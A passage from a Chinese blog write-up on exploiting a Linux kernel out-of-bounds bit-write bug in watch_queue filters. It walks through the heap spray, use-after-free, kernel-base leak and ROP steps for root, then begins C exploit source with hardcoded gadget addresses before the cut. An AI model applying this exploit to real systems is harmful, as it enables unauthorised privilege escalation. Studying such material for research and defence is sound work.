1 位则更方便我们控制一些指针，例如 <code>msg_msg-&gt;m_list</code> 双向链表</p><p>在这份公开的 exp 中使用的其实是与 CVE-2021-22555 相同的利用技巧，只不过篡改 <code>msg_msg</code> 头部的方式不是邻接溢出写 0，而是越界写 1；接下来笔者将<del>大幅拷贝</del>使用与 CVE-2021-22555 相同的利用技巧完成对该漏洞的利用</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列，构造重叠辅助消息"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列，构造重叠辅助消息</h3><p>现在我们有了一个堆上越界写 1 位，我们该怎么利用呢？比较朴素的一种思想便是覆写一个结构体中的指针，利用 partial overwrite 使得两个这样的结构体的头部指针指向同一个结构体，<strong>从而实现 object overlapping</strong></p><p>那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 96，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>之后我们读出其中几个消息队列的主消息以产生空洞，再利用 <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> 获取到我们刚释放的 <code>msg_msg</code> 结构体的空间</p><p><img src="https://s2.loli.net/2022/04/06/pql2L98kxRvaZzA.png" alt="image.png"></p><p>这里需要注意的是<strong>我们至少要释放两个主消息，因为在分配到 watch_filter 之前 memdup_user() 还需要获取一个对象</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br></pre></td></tr></table></figure><p>对于 <code>__set_bit()</code> 而言其可以置 1 的范围如下图所示，刚好可以覆盖到下一相邻 object 的前 16 字节</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt="image.png"></p><p>利用越界置 1 位我们可以覆写到其相邻的主消息的 next 指针，若该位刚好被由 0 变为 1，则我们很容易构造出<strong>在两个消息队列上存在两个主消息指向同一个辅助消息</strong>的这样的局面</p><p><img src="https://s2.loli.net/2022/04/06/NWHMurcU36EsIAp.png" alt="image.png"></p><p>我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列</p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-释放辅助消息，构造-UAF"><a href="#Step-II-释放辅助消息，构造-UAF" class="headerlink" title="Step.II 释放辅助消息，构造 UAF"></a>Step.II 释放辅助消息，构造 UAF</h3><p>此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/04/06/w9RE63dNuVjcmbp.png" alt="image.png"></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 <code>msg_msg</code> 结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——<code>sk_buff</code>，类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>接下来我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p><img src="https://s2.loli.net/2022/04/06/QEysxG1YmcUTBAj.png" alt="image.png"></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址"><a href="#Step-IV-堆喷-pipe-buffer，泄露内核基址" class="headerlink" title="Step.IV 堆喷 pipe_buffer，泄露内核基址"></a>Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/04/06/P8AlaFMCqeSObn2.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下（基本上就是把 CVE-2021-22555 的 exp 里 trigger oob 的函数改一下就能打通了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/watch_queue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span 